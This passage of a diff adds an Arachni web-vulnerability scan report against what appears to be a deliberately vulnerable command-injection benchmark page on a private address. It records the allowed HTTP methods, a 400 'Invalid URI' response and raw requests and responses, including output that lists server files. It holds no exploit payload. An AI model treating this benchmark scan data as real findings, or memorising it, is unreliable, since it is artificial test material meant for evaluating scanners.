+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </page>
+      <referring_page>
+        <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="629c06d8eb411903acde521764d19e09"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=. HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: 629c06d8eb411903acde521764d19e09&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0367</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="526"/>
+            <header name="Date" value="Thu, 29 May 2025 11:12:00 GMT"/>
+          </headers>
+          <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 526&#xD;
+Date: Thu, 29 May 2025 11:12:00 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </referring_page>
+      <signature/>
+      <proof>GET, HEAD, POST, OPTIONS</proof>
+      <trusted>true</trusted>
+      <platform_type/>
+      <platform_name/>
+    </issue>
+    <issue>
+      <name>Interesting response</name>
+      <description>
+The server responded with a non 200 (OK) nor 404 (Not Found) status code.
+This is a non-issue, however exotic HTTP response status codes can provide useful
+insights into the behavior of the web application and assist with the penetration test.
+</description>
+      <remedy_guidance/>
+      <remedy_code/>
+      <severity>informational</severity>
+      <check>
+        <name>Interesting responses</name>
+        <description>Logs all non 200 (OK) server responses.</description>
+        <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@arachni-scanner.com&gt;</author>
+        <version>0.2.1</version>
+        <shortname>interesting_responses</shortname>
+      </check>
+      <digest>1950978602</digest>
+      <references>
+        <reference title="w3.org" url="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html"/>
+      </references>
+      <vector>
+        <class>Arachni::Element::Server</class>
+        <type>server</type>
+        <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C</url>
+        <action>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C</action>
+      </vector>
+      <remarks/>
+      <page>
+        <body>&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 &#x2013; Bad Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 &#x2013; Bad Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid URI&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.97&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="629c06d8eb411903acde521764d19e09"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: 629c06d8eb411903acde521764d19e09&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C</url>
+          <code>400</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.011</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Type" value="text/html;charset=utf-8"/>
+            <header name="Content-Language" value="en"/>
+            <header name="Content-Length" value="795"/>
+            <header name="Date" value="Thu, 29 May 2025 11:12:02 GMT"/>
+            <header name="Connection" value="close"/>
+          </headers>
+          <body>&lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 &#x2013; Bad Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 &#x2013; Bad Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Status Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid URI&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).&lt;/p&gt;&lt;hr class="line" /&gt;&lt;h3&gt;Apache Tomcat/9.0.97&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</body>
+          <raw_headers>HTTP/1.1 400 &#xD;
+Content-Type: text/html;charset=utf-8&#xD;
+Content-Language: en&#xD;
+Content-Length: 795&#xD;
+Date: Thu, 29 May 2025 11:12:02 GMT&#xD;
+Connection: close&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </page>
+      <referring_page>
+        <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="629c06d8eb411903acde521764d19e09"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=. HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: 629c06d8eb411903acde521764d19e09&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0367</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="526"/>
+            <header name="Date" value="Thu, 29 May 2025 11:12:00 GMT"/>
+          </headers>
+          <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;
+Here is the standard output of the command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;boot.ini&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;&lt;br&gt;Here is the std err of the command (if any):&lt;br&gt;</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 526&#xD;
+Date: Thu, 29 May 2025 11:12:00 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </referring_page>
+      <signature/>
+      <proof>HTTP/1.1 400 </proof>
+      <trusted>true</trusted>
+      <platform_type/>
+      <platform_name/>
+    </issue>
+  </issues>
+  <plugins>
+    <healthmap>
+      <name>Health map</name>
+      <description>Generates a simple list of safe/unsafe URLs.</description>
+      <results>
+        <map>
+          <with_issues>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824</with_issues>
+          <with_issues>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824/%5C.%5C</with_issues>
+          <with_issues>https://192.168.6.149:8443/benchmark/cmdi-00/BenchmarkTest00824?BenchmarkTest00824=.</with_issues>
+        </map>
+        <total>3</total>
+        <with_issues>3</with_issues>
+        <without_issues>0</without_issues>
+        <issue_percentage>100</issue_percentage>
+      </results>
+    </healthmap>
+  </plugins>
+</report>
